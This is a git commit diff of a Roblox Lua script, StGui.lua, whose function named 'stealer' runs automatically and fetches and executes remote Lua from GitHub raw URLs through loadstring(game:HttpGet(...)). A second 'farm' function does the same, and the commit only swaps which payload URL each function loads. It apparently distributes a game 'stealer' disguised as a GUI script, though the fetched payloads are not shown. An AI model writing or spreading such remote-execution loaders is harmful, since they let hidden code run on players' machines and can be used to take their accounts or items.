875ac3884fe727c7acc4c74b9b0f72a38076c42b
Unknownloser01001 <cutenies12345@gmail.com>
2025-06-13 21:48:20 +0800

    Update StGui.lua

--- StGui.lua
+++ StGui.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui2/refs/heads/main/Gagi.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui/refs/heads/main/Itzfreespam1.lua'))()
 end
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui/refs/heads/main/Itzfreespam1.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownloser01001/Gui2/refs/heads/main/Gagi.lua'))()
 end
 
 task.spawn(stealer)
